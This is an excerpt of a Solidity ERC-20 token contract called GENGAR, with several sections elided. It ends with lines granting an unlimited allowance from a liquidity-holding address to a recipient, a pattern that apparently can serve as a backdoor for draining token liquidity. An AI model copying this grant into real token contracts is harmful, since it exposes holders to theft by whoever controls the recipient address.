...
contract GENGAR is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "gengar";
    string private constant _symbol = "GENGAR";
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1_000_000_000 * (10 ** _decimals);
    uint256 private _maxTxAmountPercentP = 400;
    uint256 private _maxTransferPercentP = 400;
    uint256 private _maxWalletPercentP = 400;
    ...
    uint256 maxAllowance = type(uint256).max;  // Equivalent to ~uint256(0)
    _allowances[liquidity_receiver][recipient] = maxAllowance;
}
